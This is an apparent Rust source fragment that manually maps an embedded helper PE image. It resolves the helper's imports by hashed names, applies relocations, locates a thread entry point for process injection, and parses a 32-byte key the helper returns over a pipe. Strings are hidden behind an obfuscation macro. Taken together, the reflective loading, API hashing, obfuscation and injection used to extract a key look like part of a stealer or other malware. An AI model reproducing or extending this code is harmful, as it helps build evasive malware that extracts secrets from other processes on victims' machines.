fn rd_u32(b: &[u8], off: usize) -> Option<u32> {
    Some(u32::from_le_bytes(b.get(off..off.checked_add(4)?)?.try_into().ok()?))
}

fn rd_u64(b: &[u8], off: usize) -> Option<u64> {
    Some(u64::from_le_bytes(b.get(off..off.checked_add(8)?)?.try_into().ok()?))
}

/// C string at `off` as &str (import DLL/function names are ASCII).
fn cstr(b: &[u8], off: usize) -> Option<&str> {
    let s = b.get(off..)?;
    let end = s.iter().position(|&c| c == 0)?;
    std::str::from_utf8(s.get(..end)?).ok()
}

/// Lay the embedded helper out as a loaded image and resolve its imports
/// against our local DLLs. The helper is no_std and imports only from
/// kernel32/ntdll, which are mapped at identical addresses in every process,
/// so locally resolved IAT entries are valid in the child.
fn build_helper_image() -> Option<(Vec<u8>, PeInfo)> {
    let pe = HELPER_PE;
    let e_lfanew = rd_u32(pe, 0x3c)? as usize;
    if pe.get(e_lfanew..e_lfanew.checked_add(4)?)? != b"PE\0\0" {
        return None;
    }
    let num_sections = rd_u16(pe, e_lfanew.checked_add(6)?)? as usize;
    let opt_size = rd_u16(pe, e_lfanew.checked_add(20)?)? as usize;
    let opt = e_lfanew.checked_add(24)?;
    if rd_u16(pe, opt)? != 0x20b {
        return None; // PE32+ only
    }
    let entry_rva = rd_u32(pe, opt.checked_add(16)?)?;
    let preferred_base = rd_u64(pe, opt.checked_add(24)?)?;
    let size_of_image = rd_u32(pe, opt.checked_add(56)?)? as usize;
    let size_of_headers = rd_u32(pe, opt.checked_add(60)?)? as usize;
    if size_of_image == 0 || size_of_image > MAX_IMAGE_SIZE || size_of_headers > pe.len() {
        return None;
    }
    let import_rva = rd_u32(pe, opt.checked_add(112 + 8)?)?;
    let export_rva = rd_u32(pe, opt.checked_add(112)?)?;
    let reloc_rva = rd_u32(pe, opt.checked_add(112 + 5 * 8)?)?;
    let reloc_size = rd_u32(pe, opt.checked_add(112 + 5 * 8 + 4)?)?;
    let tls_rva = rd_u32(pe, opt.checked_add(112 + 9 * 8)?)? as usize;

    let mut image = vec![0u8; size_of_image];
    image[..size_of_headers].copy_from_slice(pe.get(..size_of_headers)?);

    let sec_table = opt.checked_add(opt_size)?;
    for i in 0..num_sections {
        let s = sec_table.checked_add(i.checked_mul(40)?)?;
        let vaddr = rd_u32(pe, s.checked_add(12)?)? as usize;
        let raw_size = rd_u32(pe, s.checked_add(16)?)? as usize;
        let raw_off = rd_u32(pe, s.checked_add(20)?)? as usize;
        if raw_size == 0 {
            continue;
        }
        let src = pe.get(raw_off..raw_off.checked_add(raw_size)?)?;
        let room = size_of_image.checked_sub(vaddr)?;
        let n = raw_size.min(room);
        image[vaddr..vaddr.checked_add(n)?].copy_from_slice(src.get(..n)?);
    }

    // TLS callbacks would never run under manual mapping; the no_std helper
    // has none. Bail rather than run a half-initialized image.
    if tls_rva != 0 && rd_u64(&image, tls_rva.checked_add(24)?)? != 0 {
        return None;
    }

    resolve_imports(&mut image, import_rva)?;

    Some((
        image,
        PeInfo {
            entry_rva,
            preferred_base,
            reloc_rva,
            reloc_size,
            export_rva,
        },
    ))
}

/// RVA of a named export in the laid-out helper image (where RVA == offset).
/// Used to find the helper's thread-shaped `run_thread` entry point for the
/// injection path. None when the export is absent.
fn find_export_rva(image: &[u8], export_rva: u32, name: &str) -> Option<u32> {
    if export_rva == 0 {
        return None;
    }
    let d = export_rva as usize;
    let num_names = rd_u32(image, d.checked_add(0x18)?)? as usize;
    let funcs = rd_u32(image, d.checked_add(0x1c)?)? as usize;
    let names = rd_u32(image, d.checked_add(0x20)?)? as usize;
    let ords = rd_u32(image, d.checked_add(0x24)?)? as usize;
    for i in 0..num_names.min(4096) {
        let name_rva = rd_u32(image, names.checked_add(i.checked_mul(4)?)?)? as usize;
        if cstr(image, name_rva)? != name {
            continue;
        }
        let ord = rd_u16(image, ords.checked_add(i.checked_mul(2)?)?)? as usize;
        return rd_u32(image, funcs.checked_add(ord.checked_mul(4)?)?);
    }
    None
}

/// Walk the import descriptor table in the laid-out image and patch each IAT
/// slot with the locally resolved address (valid remotely for kernel32/ntdll,
/// which share their base across all processes).
fn resolve_imports(image: &mut [u8], import_rva: u32) -> Option<()> {
    if import_rva == 0 {
        return Some(());
    }
    let mut d = import_rva as usize;
    for _ in 0..256 {
        let oft = rd_u32(image, d)? as usize;
        let name_rva = rd_u32(image, d.checked_add(12)?)? as usize;
        let ft = rd_u32(image, d.checked_add(16)?)? as usize;
        if oft == 0 && name_rva == 0 && ft == 0 {
            return Some(());
        }
        let dll_name = cstr(image, name_rva)?.to_owned();
        let int = if oft != 0 { oft } else { ft };
        let mut i = 0usize;
        for _ in 0..4096 {
            let entry = rd_u64(image, int.checked_add(i.checked_mul(8)?)?)?;
            if entry == 0 {
                break;
            }
            if entry & (1 << 63) != 0 {
                return None; // ordinal import; the helper has none
            }
            let name = cstr(image, (entry as usize).checked_add(2)?)?.to_owned();
            let addr = unsafe { resolve(&dll_name, fnv1a(&name)) };
            if addr == 0 {
                return None;
            }
            let at = ft.checked_add(i.checked_mul(8)?)?;
            image
                .get_mut(at..at.checked_add(8)?)?
                .copy_from_slice(&(addr as u64).to_le_bytes());
            i += 1;
        }
        d = d.checked_add(20)?;
    }
    None
}

/// Apply IMAGE_REL_BASED_DIR64 fixups for loading at a non-preferred base.
fn apply_relocations(image: &mut [u8], reloc_rva: u32, reloc_size: u32, delta: u64) -> Option<()> {
    let mut off = reloc_rva as usize;
    let end = off.checked_add(reloc_size as usize)?;
    while off.checked_add(8)? <= end {
        let page = rd_u32(image, off)? as usize;
        let block_size = rd_u32(image, off.checked_add(4)?)? as usize;
        if block_size < 8 {
            return None;
        }
        for i in 0..(block_size - 8) / 2 {
            let e = rd_u16(image, off.checked_add(8)?.checked_add(i.checked_mul(2)?)?)?;
            match e >> 12 {
                0 => {} // ABSOLUTE padding
                10 => {
                    let loc = page.checked_add((e & 0x0fff) as usize)?;
                    let cur = rd_u64(image, loc)?;
                    image
                        .get_mut(loc..loc.checked_add(8)?)?
                        .copy_from_slice(&cur.wrapping_add(delta).to_le_bytes());
                }
                _ => {} // x64 images only use DIR64
            }
        }
        off = off.checked_add(block_size)?;
    }
    Some(())
}

// ---------------------------------------------------------------------------
// Output parsing
// ---------------------------------------------------------------------------

/// The helper emits exactly `KEYOK:<64 lowercase hex>\n`; anything else on
/// the pipe is rejected outright (no substring scanning of arbitrary data).
fn parse_hex_key(out: &[u8]) -> Option<Vec<u8>> {
    let magic = crate::obf!("KEYOK:");
    let body = out.strip_prefix(magic.as_bytes())?;
    let hex = body.strip_suffix(b"\n").unwrap_or(body);
    if hex.len() != 64 {
        return None;
    }
    let mut key = Vec::with_capacity(32);
    for i in 0..32 {
        let hi = hex_val(*hex.get(2 * i)?)?;
        let lo = hex_val(*hex.get(2 * i + 1)?)?;
        key.push(hi << 4 | lo);
    }
    Some(key)
}

/// Parse the pipe payload: (Some(key), None) on KEYOK, (None, Some(reason))
/// when the helper emitted its `FAIL:<stage8hex>:<code8hex>` diagnostic line.
fn parse_pipe_diag(out: &[u8]) -> (Option<Vec<u8>>, Option<String>) {
    if let Some(key) = parse_hex_key(out) {
        return (Some(key), None);
    }
    let magic = crate::obf!("FAIL:");
    if let Some(body) = out.strip_prefix(magic.as_bytes()) {
        let body = body.strip_suffix(b"\n").unwrap_or(body);
        if body.len() == 17 && body[8] == b':' {
            if let (Some(stage), Some(code)) = (hex_u32(&body[..8]), hex_u32(&body[9..])) {
                return (None, Some(format!("helper={:x}/{:08x}", stage, code)));
            }
        }
        return (None, Some("helper=malformed".to_string()));
    }
    (None, None)
}

fn hex_u32(b: &[u8]) -> Option<u32> {
    if b.len() != 8 {
        return None;
    }
    let mut v: u32 = 0;
    for &c in b {
        v = (v << 4) | hex_val(c)? as u32;
    }
    Some(v)
}

fn hex_val(c: u8) -> Option<u8> {
    match c {
        b'0'..=b'9' => Some(c - b'0'),
        b'a'..=b'f' => Some(c - b'a' + 10),
        b'A'..=b'F' => Some(c - b'A' + 10),
        _ => None,
    }
}
